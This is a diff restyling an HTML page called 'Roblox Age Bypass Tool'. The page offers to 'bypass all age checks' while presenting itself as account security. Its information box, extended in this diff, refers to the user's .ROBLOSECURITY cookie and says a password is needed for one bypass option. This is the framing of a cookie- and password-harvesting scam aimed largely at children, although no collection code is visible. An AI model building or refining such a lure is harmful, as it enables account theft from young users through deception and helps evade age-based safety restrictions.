@@ -6,10 +6,14 @@
   <title>Roblox Age Bypass Tool</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
       font-family: 'Inter', sans-serif;
-      background: radial-gradient(circle at top, #101933, #0a0d1e);
+      background: linear-gradient(to bottom, #0c0f1f, #090d1a);
       color: #fff;
       display: flex;
       flex-direction: column;
@@ -18,35 +22,37 @@
     }
 
     h1 {
-      font-size: 32px;
-      font-weight: 600;
-      margin-bottom: 10px;
+      font-size: 36px;
+      font-weight: 700;
       background: linear-gradient(90deg, #ff00c8, #00f0ff);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
+      margin-bottom: 10px;
     }
 
-    p.subtitle {
+    .subtitle {
       font-size: 16px;
-      color: #bbb;
+      color: #aaa;
       margin-bottom: 40px;
       text-align: center;
+      max-width: 500px;
     }
 
-    .card {
-      background: #121c33;
-      padding: 30px;
+    .container {
+      background: #111a2e;
       border-radius: 12px;
-      box-shadow: 0 0 20px #0005;
-      max-width: 600px;
+      padding: 30px;
       width: 100%;
-      margin-bottom: 20px;
+      max-width: 600px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+      margin-bottom: 30px;
     }
 
     label {
       display: block;
       font-weight: 600;
       margin-bottom: 10px;
+      font-size: 18px;
     }
 
     select {
@@ -59,30 +65,35 @@
       font-size: 16px;
     }
 
-    .info-text {
+    .info-box {
+      background: #1d2944;
+      border-left: 4px solid #ffc107;
+      padding: 20px;
+      border-radius: 10px;
       font-size: 14px;
       color: #ddd;
-      background-color: transparent;
-      padding: 0;
-      margin-top: 10px;
+      margin-top: 30px;
+      box-shadow: inset 0 0 8px rgba(255, 193, 7, 0.2);
     }
 
-    .info-text ul {
-      padding-left: 20px;
+    .info-box ul {
       margin: 10px 0 0 0;
+      padding-left: 20px;
     }
 
-    .info-text li {
+    .info-box li {
       margin-bottom: 8px;
     }
 
-    .info-text strong {
+    .info-title {
+      font-weight: bold;
       color: #ffc107;
+      font-size: 15px;
     }
 
     @media (max-width: 600px) {
       h1 {
-        font-size: 24px;
+        font-size: 28px;
       }
     }
   </style>
@@ -91,18 +102,19 @@
   <h1>ROBLOX AGE BYPASS TOOL</h1>
   <p class="subtitle">Secure your ROBLOX account with advanced bypass techniques for age restrictions</p>
 
-  <div class="card">
-    <label for="bypass">👤 Account Security Options</label>
+  <div class="container">
+    <label for="bypass">🔐 Account Security Options</label>
     <select id="bypass">
       <option>-- Select an option --</option>
       <option>Bypass for under 13</option>
       <option>Bypass all age checks</option>
     </select>
 
-    <div class="info-text">
-      <strong>⚠️ Important Information</strong>
+    <div class="info-box">
+      <div class="info-title">⚠️ Important Information</div>
       <ul>
         <li>This tool is for educational purposes only</li>
+        <li>Your .ROBLOSECURITY cookie is sensitive information</li>
         <li>Choose the appropriate bypass method for your account</li>
         <li>Password is required only for 13+ All Ages bypass</li>
         <li>Processing may take 5–10 seconds depending on server load</li>
@@ -112,4 +124,3 @@
   </div>
 </body>
 </html>
-
